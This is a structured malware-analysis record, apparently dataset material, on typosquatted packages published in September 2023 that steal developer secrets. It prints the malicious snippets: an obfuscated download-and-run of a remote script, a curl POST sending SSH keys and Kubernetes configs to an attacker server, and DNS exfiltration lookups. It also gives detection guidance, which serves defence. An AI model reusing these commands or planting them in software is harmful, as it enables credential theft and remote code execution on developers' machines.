package_info.package_name: Multiple (e.g., shineouts, apm-web-vitals, eslint-plugin-shein-soc-raw, ssc-concurrent-log-handler, etc.)
package_info.package_versions: All versions published between September 12 and September 24, 2023
package_info.why_malicious: These packages are designed to steal sensitive developer and system information, including SSH private keys and Kubernetes configs, and exfiltrate them to attacker-controlled servers. They use typosquatting to impersonate popular packages, employ obfuscation and external script loading, and execute malicious code automatically during installation.

malicious_snippets.code_snippet:
shell = b'wget -qO - https://down.threatest.com/uploads/install.sh | bash'
encoded = base64.b64encode(shell)
os.system('echo %s|base64 -d|bash' % encoded)
malicious_snippets.code_behavior: Downloads and executes a remote bash script from an attacker-controlled server using wget, with the command base64-encoded to evade detection.

malice_analysis.why_suspicious: Executes a remote script from an untrusted domain during install/import, a classic malware delivery technique.
malice_analysis.violated_expectations: Legitimate packages should not download and execute remote code automatically.
malice_analysis.similar_legitimate_use: Automated installers for legitimate dependencies (rare, and should be explicit).

execution_context.file_location: preinstall script in package.json or setup.py

malicious_snippets.code_snippet:
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "msg={
  \"Current_Time\":\"$(date +%Y-%m-%dT%H:%M:%S.%3NZ)\",
  \"Os_Version\":\"$(uname -a | base64 | tr -d '\n')\",
  \"Current_Path\":\"$(pwd)\",
  \"HostName\":\"$(hostname)\",
  \"UserName\":\"$(whoami)\",
  \"ID\":\"$(id | cut -d ' ' -f 1)\",
  \"External_ip\":\"$(curl -s ifconfig.me)\",
  \"Intranet_ip\":\"$(ifconfig | grep -m 1 inet | awk '{print $2}')\",
  \"tagDen\":\"$tagDen\",
  \"SSH_Private_Key\":\"$(cat $HOME/.ssh/id_rsa | base64)\",
  \"Kubernetes_Config\":\"$(cat $HOME/.kube/config | base64)\"
}" https://app.threatest.com/report/
malicious_snippets.code_behavior: Collects system, user, and sensitive credential information, then exfiltrates it via HTTP POST to an attacker-controlled endpoint.

malice_analysis.why_suspicious: Harvests sensitive files (SSH keys, kube configs) and system info, then sends them to an external server.
malice_analysis.violated_expectations: Legitimate packages should never access or transmit private keys or configuration files.
malice_analysis.similar_legitimate_use: Diagnostic scripts for internal IT (never in public packages).

malicious_snippets.code_snippet:
touch ConceptualTest.txt
nslookup "$(uname).$tagDen.H.$doma"
nslookup "$(hostname).$tagDen.N.$doma"
nslookup "$(whoami).$tagDen.R.$doma"
nslookup "$(pwd).$tagDen.P.$doma"
malicious_snippets.code_behavior: Performs DNS exfiltration of system information by encoding it into subdomains of attacker-controlled domains.

malice_analysis.why_suspicious: Uses DNS queries to leak system information, a stealthy exfiltration method.
malice_analysis.violated_expectations: Legitimate packages do not perform DNS lookups with encoded system/user info.
malice_analysis.similar_legitimate_use: None in public packages; sometimes in red-team tools.
key_indicators: System info embedded in DNS queries

attack_chain.action: Malicious package is installed, triggering preinstall/import-time code execution.
attack_chain.leads_to: Download and execution of remote malicious script.

attack_chain.action: Remote script collects sensitive system and user data, including SSH keys and Kubernetes configs.
Exfiltration of collected data via HTTP POST and DNS queries to attacker-controlled infrastructure.
attack_chain.leads_to: Attacker receives sensitive credentials and system information.

behavioral_signatures: Automatic execution of shell or Python code during install/import
Network requests to untrusted or suspicious domains during package installation
Access to sensitive files such as ~/.ssh/id_rsa and ~/.kube/config
Base64 encoding/decoding of shell commands or sensitive data
file_indicators: Presence of install.sh or similar scripts downloaded from external domains
Preinstall or postinstall hooks in package.json or setup.py with obfuscated code
network_indicators: DNS queries with encoded system/user info in subdomains
detection_knowledge.how_to_detect: Monitor for packages that execute shell commands or download remote scripts during installation. Flag any package that accesses SSH private keys or Kubernetes configs. Detect base64-encoded shell commands and outbound network requests to known malicious domains or via DNS with encoded data. Use file integrity monitoring to catch unauthorized creation of files like ConceptualTest.txt.
